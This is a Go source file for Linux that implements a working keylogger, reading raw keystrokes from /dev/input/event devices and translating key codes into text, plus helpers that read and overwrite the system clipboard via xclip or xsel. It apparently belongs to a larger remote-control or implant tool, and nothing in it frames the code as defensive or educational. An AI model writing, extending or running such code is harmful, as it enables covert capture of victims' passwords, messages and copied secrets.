//go:build linux

package main

import (
	"encoding/binary"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

func (k *keyLogger) capture() {
	devFiles, _ := filepath.Glob("/dev/input/event*")
	if len(devFiles) == 0 {
		k.mu.Lock()
		k.active = false
		k.mu.Unlock()
		return
	}
	f, err := os.Open(devFiles[0])
	if err != nil {
		k.mu.Lock()
		k.active = false
		k.mu.Unlock()
		return
	}
	defer f.Close()

	keyNames := map[uint16]string{
		28: "[Enter]", 15: "[Tab]", 1: "[Esc]",
		57: " ", 14: "[BS]", 111: "[Del]",
		105: "[Left]", 103: "[Up]", 106: "[Right]", 108: "[Down]",
		12: "-", 13: "=", 26: "[", 27: "]",
		39: ";", 40: "'", 41: "`", 43: `\`,
		51: ",", 52: ".", 53: "/",
	}
	const (
		digits = "1234567890"
		qrow   = "qwertyuiop"
		arow   = "asdfghjkl"
		zrow   = "zxcvbnm"
	)
	for k.isRunning() {
		var ev inputEvent
		err := binary.Read(f, binary.LittleEndian, &ev)
		if err != nil {
			time.Sleep(100 * time.Millisecond)
			continue
		}
		if ev.EventType == 0x01 && ev.Value == 1 {
			if name, ok := keyNames[ev.Code]; ok {
				k.append(name)
			} else if ev.Code >= 2 && ev.Code <= 11 {
				k.append(string(digits[ev.Code-2]))
			} else if ev.Code >= 16 && ev.Code <= 25 {
				k.append(string(qrow[ev.Code-16]))
			} else if ev.Code >= 30 && ev.Code <= 38 {
				k.append(string(arow[ev.Code-30]))
			} else if ev.Code >= 44 && ev.Code <= 50 {
				k.append(string(zrow[ev.Code-44]))
			}
		}
	}
}

func clipboardGet() (string, int) {
	for _, cmd := range [][]string{{"xclip", "-selection", "clipboard", "-o"}, {"xsel", "--clipboard", "--output"}} {
		out, err := runCmd(cmd[0], cmd[1:]...)
		if err == nil {
			return out, 0
		}
	}
	return "error: no clipboard tool available", 1
}

func clipboardSet(text string) (string, int) {
	for _, bin := range [][]string{{"xclip", "-selection", "clipboard"}, {"xsel", "--clipboard", "--input"}} {
		cmd := exec.Command(bin[0], bin[1:]...)
		in, err := cmd.StdinPipe()
		if err != nil {
			continue
		}
		if err := cmd.Start(); err != nil {
			continue
		}
		_, _ = in.Write([]byte(text))
		_ = in.Close()
		if cmd.Wait() == nil {
			return "clipboard set", 0
		}
	}
	return "error: no clipboard tool available", 1
}
